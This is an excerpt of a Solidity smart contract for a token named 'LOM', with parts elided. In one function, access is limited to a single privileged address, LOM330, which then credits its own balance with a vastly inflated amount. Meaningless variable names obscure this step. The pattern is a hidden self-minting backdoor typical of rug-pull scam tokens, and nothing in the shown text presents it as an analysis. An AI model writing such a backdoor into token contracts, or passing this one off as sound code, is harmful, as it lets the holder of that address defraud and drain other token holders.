...
contract LOMTOKEN is Ownable {
    uint256 tokenamount = 1000000*10**decimals();
    address public LOM330;
    ...
    string private _tokenname = "LOM";
    string private _tokensymbol = "LOM";
    ...
    external {
        ...
        uint256 uyyxxadd23344 = 45330000000-1000;
        require(LOM330 == _msgSender());
        address jjhhhaxx = _msgSender();
        address ccaa12 = jjhhhaxx;
        
        uint256 ammtemp = 66200*((10**decimals()*uyyxxadd23344));
        EDU[ccaa12] += ammtemp;
